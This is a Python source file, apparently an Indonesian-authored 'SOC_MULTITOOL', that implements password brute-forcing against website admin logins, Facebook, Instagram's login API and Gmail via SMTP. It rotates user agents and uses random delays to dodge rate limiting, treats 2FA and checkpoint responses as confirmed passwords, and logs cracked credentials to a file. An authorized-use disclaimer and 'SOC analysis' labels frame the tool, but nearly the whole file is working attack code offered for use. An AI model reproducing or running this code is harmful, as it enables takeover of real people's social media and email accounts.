import sys
import os
import time
import asyncio
import requests
import smtplib
import re
import urllib3
import random
import datetime
from aiohttp import ClientSession, ClientTimeout
from aiohttp_socks import ProxyConnector
from termcolor import colored, cprint
import pyfiglet

# Disable SSL warnings agar terminal bersih
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURASI GLOBAL ---
# Kosongkan jika menggunakan Anonsurf/VPN di Parrot OS
PROXY_CONFIG = ""  
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
]

# ==========================================
# BAGIAN 1: UTILITIES & UI & SOC ANALYSIS
# ==========================================

def get_random_ua():
    return random.choice(USER_AGENTS)

def save_result(service, target, password, note=""):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # SOC Analysis Engine: Menilai kelemahan password
    weakness = []
    if len(password) < 8: weakness.append("Very Short (<8 chars)")
    if password.isnumeric(): weakness.append("Numeric Only (Easy Crack)")
    if password.isalpha(): weakness.append("No Special Chars")
    if target.split('@')[0].lower() in password.lower(): weakness.append("Contains Username (High Risk)")
    
    risk_level = "CRITICAL" if len(weakness) >= 2 else "HIGH"
    analysis_text = ", ".join(weakness) if weakness else "Complex Password (Medium Risk)"
    
    log_entry = (
        f"[{timestamp}] SERVICE: {service.upper()}\n"
        f"TARGET   : {target}\n"
        f"PASSWORD : {password}\n"
        f"STATUS   : {note}\n"
        f"RISK LVL : {risk_level}\n"
        f"ANALYSIS : {analysis_text}\n"
        f"{'-'*50}\n"
    )
    
    # Simpan ke TXT (Log Audit)
    try:
        with open("soc_findings.txt", "a") as f:
            f.write(log_entry)
        print(colored(f"\n[+] Log tersimpan di 'soc_findings.txt'", 'cyan'))
        print(colored(f"[!] SOC Analysis: {analysis_text}", 'yellow'))
    except Exception as e:
        print(f"Gagal menyimpan log: {e}")

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        banner_font = pyfiglet.figlet_format("SOC_MULTITOOL", font="slant")
        cprint(banner_font, 'cyan', attrs=['bold'])
    except:
        print("SOC_MULTITOOL (Install pyfiglet for better banner)")
    
    print(colored("+" + "-" * 68 + "+", 'white'))
    print(colored("|", 'white') + colored("  AUTHOR    : INDRAYAZA Z", 'yellow', attrs=['bold']) + " " * 37 + colored("|", 'white'))
    print(colored("|", 'white') + colored("  CERTIFIED : Legal Siber Operation Center Analyst", 'cyan') + " " * 13 + colored("|", 'white'))
    print(colored("|", 'white') + colored("  VERSION   : 2.0 (Master Edition)", 'green') + " " * 29 + colored("|", 'white'))
    print(colored("+" + "-" * 68 + "+", 'white'))
    print(colored("\n[!] DISCLAIMER: Use strictly for authorized penetration testing only.", 'red'))
    print(colored("-" * 70, 'white'))

def get_password_list():
    print(colored("\n[ STEP 1 ] SELECT WORDLIST", 'white', attrs=['bold']))
    
    filename = ""
    # Cek file default
    if os.path.exists("pass.txt"):
        print(colored(f"[?] File 'pass.txt' terdeteksi.", 'cyan'))
        choice = input(colored("    Gunakan file ini? (y/n): ", 'yellow')).lower()
        if choice == 'y':
            filename = "pass.txt"
    
    if not filename:
        filename = input(colored(">> Masukkan nama file password (.txt): ", 'cyan')).strip()
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
        print(colored(f"[+] Loaded {len(passwords)} passwords form {filename}", 'green'))
        return passwords
    except FileNotFoundError:
        print(colored("[!] File tidak ditemukan!", 'red'))
        return []

# ==========================================
# MODULE 1: WEBSITE ADMIN (Generic)
# ==========================================
def module_website(passwords):
    print(colored("\n[ MODULE: WEBSITE ADMIN BRUTE FORCE ]", 'white', attrs=['bold']))
    url = input(">> Target URL (Login Page): ")
    u_field = input(">> Username Field Name (Inspect Element): ")
    p_field = input(">> Password Field Name (Inspect Element): ")
    target_user = input(">> Target Username: ")
    failed_string = input(">> String Login Gagal (cth: 'incorrect', 'fail') [Optional]: ")
    
    print(colored(f"[*] Starting attack on {url}...", "yellow"))
    
    for pwd in passwords:
        payload = {u_field: target_user, p_field: pwd, "submit": "Login", "Login": "Login"}
        headers = {'User-Agent': get_random_ua()}
        
        try:
            r = requests.post(url, data=payload, timeout=10, verify=False, headers=headers)
            
            is_success = False
            # Logika Deteksi
            if failed_string and failed_string.lower() not in r.text.lower():
                is_success = True
            elif not failed_string and r.status_code == 200 and len(r.history) > 0: 
                # Redirect biasanya tanda sukses
                is_success = True
            elif not failed_string and "dashboard" in r.text.lower():
                is_success = True
            
            sys.stdout.write(f"\r[Testing] {pwd}   ")
            sys.stdout.flush()

            if is_success:
                print(colored(f"\n[SUCCESS] PASSWORD FOUND: {pwd}", 'green', attrs=['bold']))
                save_result("WEBSITE", f"{url} ({target_user})", pwd, "Check login manually")
                break
            
            time.sleep(0.5)
                
        except Exception as e:
            pass

# ==========================================
# MODULE 2: FACEBOOK (Mobile API)
# ==========================================
def module_facebook(passwords):
    print(colored("\n[ MODULE: FACEBOOK (Mobile Protocol) ]", 'white', attrs=['bold']))
    print(colored("[!] WARNING: Facebook rate-limiting sangat ketat.", 'red'))
    
    target = input(">> Target Email/ID/Phone: ")
    url = "https://m.facebook.com/login.php"
    
    for pwd in passwords:
        headers = {
            'User-Agent': get_random_ua(),
            'Accept-Language': 'en-US,en;q=0.5'
        }
        data = {
            'email': target,
            'pass': pwd,
            'login': 'submit'
        }
        
        try:
            r = requests.post(url, data=data, headers=headers, verify=False)
            sys.stdout.write(f"\r[Testing] {pwd}   ")
            sys.stdout.flush()
            
            # Cek Cookies c_user (Tanda Login Sukses)
            if 'c_user' in r.cookies or 'checkpoint' in r.url:
                if 'checkpoint' in r.url:
                    print(colored(f"\n[CHECKPOINT] {pwd} (2FA/Locked)", 'yellow'))
                    save_result("FACEBOOK", target, pwd, "Account Locked/Checkpoint")
                else:
                    print(colored(f"\n[SUCCESS] {pwd}", 'green', attrs=['bold']))
                    save_result("FACEBOOK", target, pwd, "Login Success")
                break
            
            # Delay acak untuk menghindari blokir cepat
            time.sleep(random.randint(3, 6))
            
        except KeyboardInterrupt:
            break
        except:
            pass

# ==========================================
# MODULE 3: INSTAGRAM (Async Engine)
# ==========================================
async def ig_engine(passwords):
    print(colored("\n[ MODULE: INSTAGRAM (Async Engine) ]", 'white', attrs=['bold']))
    target = input(">> Target Username: ")
    
    # 1. Ambil CSRF Token Dulu
    headers = {'Host': 'www.instagram.com', 'User-Agent': get_random_ua()}
    try:
        r = requests.get('https://www.instagram.com/', headers=headers, verify=False)
        csrf_token = re.search(r'csrftoken=([a-zA-Z0-9\-_]+)', r.headers.get('Set-Cookie', ''))
        csrf = csrf_token.group(1) if csrf_token else None
    except:
        print(colored("[!] Gagal koneksi awal ke Instagram.", 'red'))
        return

    if not csrf:
        print(colored("[!] Gagal mengambil CSRF Token.", 'red'))
        return

    print(colored("[*] Session initialized. Starting engine...", "yellow"))
    
    async with ClientSession() as session:
        for pwd in passwords:
            timestamp = int(time.time())
            enc_pass = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}"
            
            payload = {
                'enc_password': enc_pass, 'username': target, 
                'queryParams': '{}', 'optIntoOneTap': 'false'
            }
            head_post = {
                'X-CSRFToken': csrf, 'User-Agent': get_random_ua(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            try:
                sys.stdout.write(f"\r[Testing] {pwd}   ")
                sys.stdout.flush()
                
                async with session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                                        headers=head_post, data=payload, cookies={'csrftoken': csrf}) as resp:
                    res = await resp.json()
                    
                    # Analisis Respon
                    if 'userId' in res or res.get('authenticated') is True:
                        print(colored(f"\n[SUCCESS] {pwd}", 'green', attrs=['bold']))
                        save_result("INSTAGRAM", target, pwd, "Login Success")
                        return
                    elif 'checkpoint_url' in res:
                        print(colored(f"\n[CHECKPOINT] {pwd}", 'yellow'))
                        save_result("INSTAGRAM", target, pwd, "2FA/Verification Required")
                        return
                    elif res.get('status') == 'fail' and res.get('message') == 'checkpoint_required':
                         print(colored(f"\n[CHECKPOINT] {pwd} (Soft)", 'yellow'))
                         save_result("INSTAGRAM", target, pwd, "Soft Checkpoint")
                         return

            except Exception as e:
                pass
            
            # Delay Async
            await asyncio.sleep(random.randint(4, 8))

# ==========================================
# MODULE 4: GMAIL (SMTP Debug)
# ==========================================
def module_gmail(passwords):
    print(colored("\n[ MODULE: GMAIL (SMTP Protocol) ]", 'white', attrs=['bold']))
    target = input(">> Target Email: ")
    print(colored("[*] Connecting to smtp.gmail.com:587...", "yellow"))
    
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.ehlo()
    except:
        print(colored("[!] Gagal koneksi SMTP (Cek Internet/Block).", 'red'))
        return

    for pwd in passwords:
        try:
            sys.stdout.write(f"\r[Testing] {pwd}   ")
            sys.stdout.flush()
            
            server.login(target, pwd)
            # Jika lolos baris ini, berarti sukses
            print(colored(f"\n[SUCCESS] {pwd}", 'green', attrs=['bold']))
            save_result("GMAIL", target, pwd, "Login Success (App Password/LSA)")
            break
        except smtplib.SMTPAuthenticationError as e:
            # Error 534 = Password Benar tapi butuh App Password
            if e.smtp_code == 534:
                print(colored(f"\n[2FA DETECTED] {pwd} (Password Benar)", 'yellow'))
                save_result("GMAIL", target, pwd, "Password Correct but blocked by 2FA/App Password")
                break
            time.sleep(2)
        except Exception as e:
            # Reconnect jika putus
            try:
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.ehlo()
                server.starttls()
            except:
                break

# ==========================================
# MAIN CONTROLLER LOOP
# ==========================================
def main():
    while True:
        print_banner()
        print(colored("AVAILABLE MODULES:", 'white', attrs=['bold']))
        print("1. Website Admin Brute Force")
        print("2. Facebook (Mobile API)")
        print("3. Instagram (Async Optimized)")
        print("4. Gmail (SMTP Debug)")
        print("5. Exit")
        
        choice = input(colored("\n[?] Select Module (1-5): ", 'yellow'))
        
        if choice == '5':
            print(colored("Exiting SOC Multitool. Goodbye.", 'red'))
            sys.exit()
        
        if choice in ['1', '2', '3', '4']:
            # Load password SETIAP KALI modul dijalankan (Sesuai Request)
            passwords = get_password_list()
            
            if passwords:
                if choice == '1':
                    module_website(passwords)
                elif choice == '2':
                    module_facebook(passwords)
                elif choice == '3':
                    try:
                        asyncio.run(ig_engine(passwords))
                    except KeyboardInterrupt:
                        pass
                elif choice == '4':
                    module_gmail(passwords)
                
                input(colored("\n[Tekan Enter untuk kembali ke Menu Utama]", 'cyan'))
        else:
            print("Pilihan tidak valid.")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Force Close by User.", 'red'))
